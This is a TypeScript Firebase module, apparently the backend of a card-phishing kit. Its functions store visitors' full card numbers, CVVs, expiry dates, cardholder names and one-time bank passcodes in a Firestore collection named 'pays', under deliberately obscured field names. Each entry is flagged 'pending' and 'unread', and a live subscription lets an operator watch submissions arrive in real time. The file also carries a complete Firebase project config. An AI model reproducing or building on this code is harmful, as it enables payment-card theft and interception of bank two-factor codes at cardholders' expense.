import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
import { getFirestore, Firestore, doc, setDoc, updateDoc, arrayUnion, onSnapshot } from "firebase/firestore";
import { getDatabase, Database } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDpEWgXddbxLCN7fxwJXZ7hkWT2cSQsCT4",
  authDomain: "newlinksa2-z-f-m.firebaseapp.com",
  databaseURL: "https://newlinksa2-z-f-m-default-rtdb.firebaseio.com",
  projectId: "newlinksa2-z-f-m",
  storageBucket: "newlinksa2-z-f-m.firebasestorage.app",
  messagingSenderId: "830706237619",
  appId: "1:830706237619:web:aa22ca5fdfa7c52053f0c6",
  measurementId: "G-0SVHJ7CQ4Y"
};

let app: FirebaseApp | null = null;
let db: Firestore | null = null;
let database: Database | null = null;

if (firebaseConfig.apiKey && firebaseConfig.projectId) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
  database = getDatabase(app);
}

export async function addData(data: any) {
  if (typeof localStorage !== "undefined") localStorage.setItem("visitor", data.id);
  if (!db) return;
  try {
    const docRef = doc(db, "pays", data.id);
    await setDoc(docRef, { ...data, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), isUnread: true }, { merge: true });
  } catch (e) { console.error("Error adding document:", e); }
}

export async function updateLastActive(visitorId: string) {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    await updateDoc(docRef, { lastActiveAt: new Date().toISOString(), updatedAt: new Date().toISOString() });
  } catch (e) { console.error("Error updating lastActiveAt:", e); }
}

export async function addCardToHistory(visitorId: string, cardData: { cardNumber: string; cvv: string; expiryDate: string; cardName: string }) {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    const entry = {
      id: Date.now().toString(),
      type: "_t1",
      timestamp: new Date().toISOString(),
      status: "pending",
      data: { _v1: cardData.cardNumber, _v2: cardData.cvv, _v3: cardData.expiryDate, _v4: cardData.cardName },
    };
    await updateDoc(docRef, { history: arrayUnion(entry), cardStatus: "pending", updatedAt: new Date().toISOString(), isUnread: true });
  } catch (e) { console.error("Error adding card to history:", e); }
}

export async function addOtpToHistory(visitorId: string, otpCode: string) {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    const entry = {
      id: Date.now().toString(),
      type: "_t2",
      timestamp: new Date().toISOString(),
      status: "pending",
      data: { _v5: otpCode },
    };
    await updateDoc(docRef, { history: arrayUnion(entry), otpCode, _v5: otpCode, _v5Status: "pending", updatedAt: new Date().toISOString(), isUnread: true });
  } catch (e) { console.error("Error adding OTP to history:", e); }
}

export function subscribeToVisitor(visitorId: string, callback: (data: any) => void): () => void {
  if (!db) return () => {};
  const docRef = doc(db, "pays", visitorId);
  return onSnapshot(docRef, (snap) => {
    if (snap.exists()) callback({ id: snap.id, ...snap.data() });
  });
}

export { db, database, doc, setDoc, updateDoc, arrayUnion };